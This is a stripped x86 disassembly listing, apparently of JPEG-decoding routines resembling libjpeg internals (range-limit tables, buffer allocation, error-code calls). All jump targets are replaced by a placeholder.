mov ecx esi
sar ecx 0x2
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45f780
sub_45fc30
push ebx
push esi
push edi
mov ecx 0x7fc
mov esi [ eax + 0x4 ]
mov ebx [ eax + 0x1be ]
mov edx 0x1
call [ esi ]
mov ecx eax
xor edx edx
add ecx 0x3fc
xor eax eax
mov [ ebx + 0x28 ] ecx
mov ebx ecx
mov [ ebx ] edx
mov esi eax
neg esi
mov edi edx
neg edi
mov [ ecx + esi * 4 ] edi
add ebx 0x4
inc eax
inc edx
cmp eax 0x10
jl r-xdata
lea ebx [ ecx + eax * 4 ]
cmp eax 0x30
jge r-xdata
lea ebx [ ecx + eax * 4 ]
cmp eax 0xff
jg r-xdata
mov [ ebx ] edx
mov esi eax
neg esi
mov edi edx
neg edi
mov [ ecx + esi * 4 ] edi
add ebx 0x4
inc eax
xor esi esi
test al 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov esi eax
mov edi edx
neg esi
neg edi
mov [ ebx ] edx
add ebx 0x4
inc eax
mov [ ecx + esi * 4 ] edi
cmp eax 0xff
jle r-xdata
add edx esi
cmp eax 0x30
jl r-xdata
inc esi
sub_45fce8
push ebx
push esi
mov esi eax
push edi
push ebp
push ecx
mov ebx [ esi + 0x1be ]
mov eax [ ebx + 0x18 ]
mov [ esp ] eax
cmp [ esi + 0x54 ] 0x0
je r-xdata
test edx edx
je r-xdata
mov [ esi + 0x54 ] 0x2
cmp [ esi + 0x54 ] 0x2
jne r-xdata
mov [ ebx + 0x4 ] sub_45ec28
mov [ ebx + 0x8 ] sub_45fcc0
mov [ ebx + 0x1c ] 0x1
jmp r-xdata
mov [ ebx + 0x4 ] sub_45f860
mov [ ebx + 0x4 ] sub_45f92c
jmp r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp edi 0x100
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x37
mov [ eax + 0x18 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] sub_45fce4
mov edi [ esi + 0x80 ]
cmp edi 0x1
jge r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ esp ]
mov esi eax
cmp [ esi + 0x54 ] 0x2
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x18 ] 0x100
mov eax esi
mov edx [ eax ]
call [ edx ]
push 0x1000
push 0x0
mov eax [ esi ]
push eax
call sub_46a318
add esp 0xc
inc edi
add esi 0x4
cmp edi 0x20
jl r-xdata
xor edx edx
mov [ ebx + 0x1c ] edx
mov edi [ esi + 0x6c ]
add edi edi
lea edi [ edi + edi * 2 ]
add edi 0xc
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push 0x0
mov eax [ ebx + 0x20 ]
push eax
call sub_46a318
add esp 0xc
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax esi
mov ecx edi
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov [ ebx + 0x20 ] eax
xor edx edx
mov [ ebx + 0x24 ] edx
mov eax esi
call sub_45fc30
sub_45fe10
push ebx
mov ebx eax
mov eax ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
mov ecx 0x2c
mov edx 0x1
call [ esi ]
mov esi eax
xor eax eax
mov [ ebx + 0x1be ] esi
xor edx edx
mov [ esi ] sub_45fce8
mov [ esi + 0xc ] sub_45fe00
mov [ esi + 0x20 ] eax
mov [ esi + 0x28 ] edx
cmp [ ebx + 0x74 ] 0x3
je r-xdata
mov eax ebx
mov ecx 0x80
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ esi + 0x18 ] eax
xor edi edi
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x2e
mov edx [ eax ]
call [ edx ]
mov eax ebx
mov ecx 0x1000
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov edx [ esi + 0x18 ]
mov [ edx + edi * 4 ] eax
inc edi
cmp edi 0x20
jl r-xdata
mov [ esi + 0x1c ] 0x1
cmp [ ebx + 0x68 ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x10 ] eax
mov edi [ ebx + 0x5c ]
cmp edi 0x8
jge r-xdata
cmp [ ebx + 0x54 ] 0x2
jne r-xdata
mov [ ebx + 0x54 ] 0x2
cmp edi 0x100
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x37
mov [ eax + 0x18 ] 0x8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x6c ]
mov eax ebx
add ecx ecx
mov edx 0x1
mov edi [ eax + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
add ecx 0xc
call [ edi + 0x4 ]
mov [ esi + 0x20 ] eax
mov eax ebx
call sub_45fc30
mov eax ebx
push 0x3
mov ecx edi
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edi
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x18 ] 0x100
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x54 ] 0x0
je r-xdata
sub_45ff30
push ebx
push esi
mov ebx eax
push edi
add esp 0xfffffff0
mov eax [ ebx + 0x19a ]
mov [ esp ] eax
mov eax ebx
mov edx [ ebx + 0x12e ]
mov [ esp + 0x8 ] edx
mov edx 0x1
mov ecx [ ebx + 0x20 ]
mov esi [ eax + 0x4 ]
add ecx ecx
shl ecx 0x2
call [ esi ]
mov esi eax
mov eax [ esp ]
mov [ eax + 0x38 ] esi
mov edx [ ebx + 0x20 ]
mov ecx [ esp ]
shl edx 0x2
add esi edx
mov [ ecx + 0x3c ] esi
xor esi esi
mov eax [ ebx + 0xd4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov edx [ esp + 0xc ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
cdq
idiv [ ebx + 0x12e ]
mov [ esp + 0x4 ] eax
mov eax ebx
mov ecx [ esp + 0x8 ]
mov edx 0x1
add ecx 0x4
mov edi [ eax + 0x4 ]
imul ecx [ esp + 0x4 ]
add ecx ecx
shl ecx 0x2
call [ edi ]
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
shl edx 0x2
add eax edx
mov edx [ ecx + 0x38 ]
mov [ edx + esi * 4 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
add ecx 0x4
imul ecx [ esp + 0x4 ]
shl ecx 0x2
add eax ecx
mov ecx [ edx + 0x3c ]
mov [ ecx + esi * 4 ] eax
inc esi
add [ esp + 0xc ] 0x54
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45fff8
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x19a ]
xor eax eax
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov ecx [ ecx + 0x12e ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0xd4 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
lea eax [ edx + 0x8 ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x20 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov edx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
mov edx [ esp ]
mov ebx [ edx + 0x12e ]
cdq
idiv ebx
mov edx eax
mov eax [ esp + 0x4 ]
mov ebx [ esp + 0x8 ]
mov eax [ eax + 0x38 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ esp + 0x4 ]
mov edi ebx
mov eax [ eax + 0x3c ]
mov esi [ eax + esi * 4 ]
mov eax [ esp + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x20 ] edi
mov edi esi
xor eax eax
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x10 ]
mov [ esp + 0x18 ] edi
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
lea edi [ ecx + 0x2 ]
imul edi edx
cmp eax edi
jl r-xdata
mov edi [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
inc eax
mov edi [ edi ]
mov [ ebp ] edi
mov ebp [ esp + 0x20 ]
mov [ ebp ] edi
add [ esp + 0x20 ] 0x4
add [ esp + 0x1c ] 0x4
add [ esp + 0x18 ] 0x4
xor eax eax
jmp r-xdata
mov edi edx
add edi edi
cmp eax edi
jl r-xdata
mov edi edx
mov ebp [ esp + 0x10 ]
imul edi ecx
add edi eax
push [ ebp + edi * 4 ]
lea edi [ ecx - 0x2 ]
pop ebp
imul edi edx
add edi eax
mov [ esi + edi * 4 ] ebp
lea edi [ ecx - 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x10 ]
push [ ebp + edi * 4 ]
mov edi edx
pop ebp
imul edi ecx
add edi eax
inc eax
mov [ esi + edi * 4 ] ebp
xor eax eax
cmp edx eax
jle r-xdata
add [ esp + 0x14 ] 0x4
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
mov esi eax
sub esi edx
mov edi [ ebx ]
mov [ ebx + esi * 4 ] edi
inc eax
cmp edx eax
jg r-xdata
sub_460140
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x19a ]
xor eax eax
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov ecx [ ecx + 0x12e ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0xd4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x20 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov edx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ esp + 0xc ]
imul [ edx + 0x24 ]
mov edx [ esp ]
mov ebx [ edx + 0x12e ]
cdq
idiv ebx
mov edx eax
mov eax [ esp + 0x4 ]
mov ebx [ esp + 0x8 ]
mov eax [ eax + 0x38 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x3c ]
mov esi [ eax + esi * 4 ]
xor eax eax
mov edi esi
cmp edx eax
mov [ esp + 0x14 ] edi
mov edi ebx
mov [ esp + 0x10 ] edi
jle r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
lea edi [ ecx + 0x1 ]
imul edi edx
add edi eax
push [ ebx + edi * 4 ]
mov edi eax
sub edi edx
pop ebp
mov [ ebx + edi * 4 ] ebp
lea edi [ ecx + 0x1 ]
imul edi edx
add edi eax
push [ esi + edi * 4 ]
mov edi eax
sub edi edx
pop ebp
mov [ esi + edi * 4 ] ebp
lea edi [ ecx + 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x10 ]
mov ebp [ ebp ]
mov [ ebx + edi * 4 ] ebp
lea edi [ ecx + 0x2 ]
imul edi edx
add edi eax
mov ebp [ esp + 0x14 ]
mov ebp [ ebp ]
mov [ esi + edi * 4 ] ebp
inc eax
add [ esp + 0x14 ] 0x4
add [ esp + 0x10 ] 0x4
cmp edx eax
jg r-xdata
sub_46023c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x19a ]
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0xd4 ]
mov [ esp + 0xc ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x20 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edx [ esp ]
mov ebx [ ecx + 0xc ]
imul ebx [ eax + 0x24 ]
mov eax ebx
mov ecx [ edx + 0x12e ]
cdq
idiv ecx
mov esi eax
mov eax [ esp + 0xc ]
xor edx edx
mov eax [ eax + 0x2c ]
div ebx
mov ecx edx
test ecx ecx
jne r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ecx ebx
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ esp + 0x4 ]
mov eax [ edx + eax * 4 + 0x38 ]
mov edx [ esp + 0x8 ]
mov ebx [ eax + edx * 4 ]
xor eax eax
lea edx [ ebx + ecx * 4 - 0x4 ]
jmp r-xdata
lea eax [ ecx - 0x1 ]
cdq
idiv esi
inc eax
mov edx [ esp + 0x4 ]
mov [ edx + 0x48 ] eax
mov edi esi
add edi edi
cmp eax edi
jl r-xdata
lea edi [ eax + ecx ]
mov ebp [ edx ]
mov [ ebx + edi * 4 ] ebp
inc eax
inc [ esp + 0x8 ]
add [ esp + 0xc ] 0x54
sub_460300
push ebx
sub edx 0x1
mov ebx [ eax + 0x19a ]
jb r-xdata
mov edx [ eax + 0x1b6 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
dec edx
je r-xdata
mov [ ebx + 0x4 ] sub_460368
mov [ ebx + 0x4 ] sub_4603e0
call sub_45fff8
xor eax eax
mov [ ebx + 0x40 ] eax
xor ecx ecx
mov [ ebx + 0x44 ] ecx
xor eax eax
mov [ ebx + 0x4c ] eax
jmp r-xdata
mov [ ebx + 0x4 ] sub_460508
pop ebx
retn
jmp r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x34 ] ecx
pop ebx
retn
mov edx [ eax ]
mov [ edx + 0x14 ] 0x4
mov ecx [ eax ]
call [ ecx ]
pop ebx
retn
sub_460368
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ esi + 0x19a ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ esi + 0x12e ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
push edx
push edi
mov ecx [ ebp - 0x4 ]
lea edx [ ebx + 0x8 ]
push ecx
lea ecx [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov esi [ eax + 0x1a2 ]
call [ esi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
lea edx [ ebx + 0x8 ]
mov eax esi
mov ecx [ eax + 0x19e ]
call [ ecx + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor edx edx
xor ecx ecx
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x34 ] ecx
mov [ ebx + 0x30 ] 0x1
sub_4603e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x19a ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx [ ebx + 0x44 ]
sub edx 0x1
jb r-xdata
mov eax [ ebx + 0x40 ]
mov edx [ ebx + eax * 4 + 0x38 ]
mov eax esi
mov ecx [ eax + 0x19e ]
call [ ecx + 0xc ]
test eax eax
je r-xdata
xor edx edx
mov [ ebx + 0x34 ] edx
mov ecx [ esi + 0x12e ]
dec ecx
mov [ ebx + 0x48 ] ecx
mov eax [ ebx + 0x4c ]
cmp eax [ esi + 0x132 ]
jne r-xdata
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x30 ] 0x1
inc [ ebx + 0x4c ]
mov [ ebx + 0x44 ] 0x1
mov eax esi
call sub_46023c
mov edx [ ebx + 0x48 ]
push edx
mov ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebx + 0x34 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebx + eax * 4 + 0x38 ]
mov eax esi
mov edi [ eax + 0x1a2 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x48 ]
jb r-xdata
dec edx
jne r-xdata
cmp [ ebx + 0x4c ] 0x1
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebx + 0x34 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov edx [ ebx + 0x40 ]
mov edi [ eax + 0x1a2 ]
mov edx [ ebx + edx * 4 + 0x38 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x48 ]
jb r-xdata
xor [ ebx + 0x40 ] 0x1
xor edx edx
mov [ ebx + 0x30 ] edx
mov ecx [ esi + 0x12e ]
inc ecx
mov [ ebx + 0x34 ] ecx
mov eax [ esi + 0x12e ]
add eax 0x2
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x44 ] 0x2
mov eax esi
call sub_460140
xor edx edx
mov [ ebx + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
sub_460508
push ebp
mov ebp esp
push ebx
push 0x0
push edx
push ecx
mov edx [ ebp + 0x8 ]
push edx
xor edx edx
xor ecx ecx
mov ebx [ eax + 0x1a2 ]
call [ ebx + 0x4 ]
pop ebx
pop ebp
retn 0x4
sub_460528
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
mov ebx edx
mov edx 0x1
mov edi [ eax + 0x4 ]
add esp 0xfffffff4
mov ecx 0x50
call [ edi ]
mov edi eax
mov [ esi + 0x19a ] edi
mov [ edi ] sub_460300
test ebx ebx
je r-xdata
mov ecx [ esi + 0x1b6 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx [ esi + 0x12e ]
mov [ esp + 0x8 ] ecx
cmp [ esi + 0x12e ] 0x2
jge r-xdata
mov eax [ esp ]
cmp eax [ esi + 0x20 ]
jl r-xdata
mov eax esi
call sub_45ff30
mov edx [ esi + 0x12e ]
add edx 0x2
mov [ esp + 0x8 ] edx
jmp r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x2e
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
imul [ ebx + 0x24 ]
cdq
idiv [ esi + 0x12e ]
mov [ esp + 0x4 ] eax
mov eax esi
mov ecx [ esp + 0x4 ]
mov edx 0x1
imul ecx [ esp + 0x8 ]
push ecx
mov ecx [ ebx + 0x1c ]
mov ebp [ eax + 0x4 ]
imul ecx [ ebx + 0x24 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add ebx 0x54
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov ebx [ esi + 0xd4 ]
lea eax [ edi + 0x8 ]
mov edi eax
jmp r-xdata
sub_460608
cmp [ eax + 0x13a ] 0x1
mov edx [ eax + 0x19e ]
jle r-xdata
mov ecx [ eax + 0x132 ]
dec ecx
cmp ecx [ eax + 0x90 ]
jbe r-xdata
mov [ edx + 0x1c ] 0x1
jmp r-xdata
mov ecx [ eax + 0x13e ]
mov eax [ ecx + 0x48 ]
mov [ edx + 0x1c ] eax
mov eax [ eax + 0x13e ]
mov eax [ eax + 0xc ]
mov [ edx + 0x1c ] eax
jmp r-xdata
xor ecx ecx
xor eax eax
mov [ edx + 0x14 ] ecx
mov [ edx + 0x18 ] eax
retn
sub_460664
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x19e ]
cmp [ esi + 0x10 ] 0x0
je r-xdata
xor edx edx
mov [ ebx + 0x98 ] edx
pop esi
pop ebx
retn
cmp [ ebx + 0x4c ] 0x0
je r-xdata
mov [ esi + 0xc ] sub_460ae4
mov eax ebx
call sub_460cb4
test eax eax
je r-xdata
mov [ esi + 0xc ] sub_460dc4
jmp r-xdata
sub_4606a0
push ebx
push esi
push edi
add esp 0xffffffc0
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x19e ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x14e ]
dec eax
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x132 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x18 ]
mov [ esp + 0x24 ] edx
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x1c ]
cmp eax [ esp + 0x24 ]
jg r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x14 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
cmp edx [ esp + 0x10 ]
ja r-xdata
mov edx [ esp ]
inc [ edx + 0x98 ]
mov ecx [ esp ]
inc [ ecx + 0x90 ]
mov eax [ ecx + 0x90 ]
mov edx [ esp ]
cmp eax [ edx + 0x132 ]
jae r-xdata
mov eax [ esp + 0x8 ]
xor edx edx
mov [ eax + 0x14 ] edx
inc [ esp + 0x24 ]
mov ecx [ esp ]
mov eax [ ecx + 0x156 ]
shl eax 0x7
push eax
push 0x0
mov edx [ esp + 0x10 ]
mov ecx [ edx + 0x20 ]
push ecx
call sub_46a318
add esp 0xc
mov eax [ esp ]
mov edx [ esp + 0x8 ]
add edx 0x20
mov ecx [ eax + 0x1ae ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1a6 ]
call [ edx + 0xc ]
mov eax 0x4
mov eax [ esp ]
call sub_460608
mov eax 0x3
jmp r-xdata
xor edx edx
xor ecx ecx
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ecx
mov eax [ esp + 0x4 ]
mov edx eax
mov [ esp + 0x3c ] edx
mov ecx [ esp ]
lea eax [ ecx + 0x13e ]
mov [ esp + 0x38 ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x24 ]
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x14 ] eax
xor eax eax
jmp r-xdata
add esp 0x40
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx [ eax + 0x13a ]
cmp edx [ esp + 0x1c ]
jg r-xdata
mov edx [ esp + 0x38 ]
mov ebx [ edx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
inc [ esp + 0xc ]
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x10 ]
jbe r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1b2 ]
mov eax [ ebx + 0x4 ]
mov edx [ ecx + eax * 4 + 0x4 ]
mov [ esp + 0x34 ] edx
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x10 ]
jae r-xdata
mov eax [ ebx + 0x3c ]
add [ esp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx + 0x44 ]
mov eax [ ebx + 0x34 ]
jmp r-xdata
inc [ esp + 0x1c ]
add [ esp + 0x3c ] 0x4
add [ esp + 0x38 ] 0x4
mov ecx [ esp + 0x20 ]
cmp ecx [ ebx + 0x38 ]
jl r-xdata
mov [ esp + 0x28 ] eax
mov edx [ esp + 0x3c ]
mov ecx [ edx ]
mov eax [ esp + 0x24 ]
imul [ ebx + 0x24 ]
shl eax 0x2
add ecx eax
mov [ esp + 0x2c ] ecx
mov edx [ esp + 0xc ]
imul edx [ ebx + 0x40 ]
mov [ esp + 0x30 ] edx
xor ecx ecx
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x90 ]
cmp edx [ esp + 0x14 ]
jb r-xdata
mov edi [ esp + 0x30 ]
xor esi esi
cmp esi [ esp + 0x28 ]
jge r-xdata
mov ecx [ esp + 0x24 ]
add ecx [ esp + 0x20 ]
cmp ecx [ ebx + 0x48 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
add [ esp + 0x18 ] eax
mov edx [ ebx + 0x24 ]
shl edx 0x2
add [ esp + 0x2c ] edx
inc [ esp + 0x20 ]
mov eax [ esp + 0x2c ]
push eax
push edi
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add edx esi
mov eax [ esp + 0x8 ]
mov ecx [ ecx + edx * 4 + 0x20 ]
mov edx ebx
call [ esp + 0x3c ]
add edi [ ebx + 0x24 ]
inc esi
cmp esi [ esp + 0x28 ]
jl r-xdata
sub_4608f4
push ebx
push esi
push edi
add esp 0xffffffc8
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
lea esi [ esp + 0x28 ]
mov edx [ eax + 0x19e ]
mov [ esp + 0x4 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea ebx [ eax + 0x13e ]
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x13a ]
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax [ ebx ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
mov edi [ edx + 0xc ]
push edi
push 0x1
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x20 ]
mov ecx [ eax + 0x90 ]
mov eax [ edx + 0x4 ]
imul ecx edi
mov edx [ esp + 0xc ]
mov edx [ edx + eax * 4 + 0x48 ]
mov eax [ esp + 0x8 ]
mov edi [ eax + 0x4 ]
call [ edi + 0x20 ]
mov [ esi ] eax
add esi 0x4
inc [ esp + 0xc ]
add ebx 0x4
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x18 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x14 ]
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx [ esp ]
inc [ edx + 0x90 ]
mov ecx [ edx + 0x90 ]
mov eax [ esp ]
cmp ecx [ eax + 0x132 ]
jae r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x14e ]
cmp ecx [ esp + 0x8 ]
ja r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1a6 ]
call [ edx + 0xc ]
mov eax 0x4
mov eax [ esp ]
call sub_460608
mov eax 0x3
jmp r-xdata
xor ebx ebx
xor eax eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x28 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0x13e ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
inc [ esp + 0x10 ]
add esp 0x38
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov ecx [ edx + 0x13a ]
cmp ecx [ esp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
mov edx [ eax + 0x34 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0x14 ] edx
xor esi esi
mov eax [ esp + 0x24 ]
mov edx eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add edx 0x20
mov ecx [ eax + 0x1ae ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp esi [ eax + 0x38 ]
jl r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x14 ] eax
xor eax eax
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add ecx esi
mov edx [ eax ]
mov eax [ esp + 0x14 ]
shl eax 0x7
mov edx [ edx + ecx * 4 ]
add edx eax
mov eax [ esp + 0x4 ]
xor ecx ecx
lea eax [ eax + ebx * 4 + 0x20 ]
jmp r-xdata
inc [ esp + 0xc ]
add [ esp + 0x24 ] 0x4
add [ esp + 0x1c ] 0x4
mov edi [ esp + 0x18 ]
cmp ecx [ edi + 0x34 ]
jl r-xdata
mov [ eax ] edx
add edx 0x80
inc ebx
add eax 0x4
inc ecx
inc esi
sub_460ae4
push ebx
push esi
push edi
add esp 0xffffffd4
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x19e ]
mov eax [ esp ]
mov edx [ eax + 0x132 ]
dec edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x8c ]
cmp ecx [ eax + 0x94 ]
jl r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1a6 ]
call [ edx ]
test eax eax
jne r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x8c ]
cmp ecx [ eax + 0x94 ]
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov eax edi
mov [ esp + 0xc ] edx
lea edx [ esi + 0x48 ]
mov ecx [ esp ]
mov ebx [ ecx + 0xd4 ]
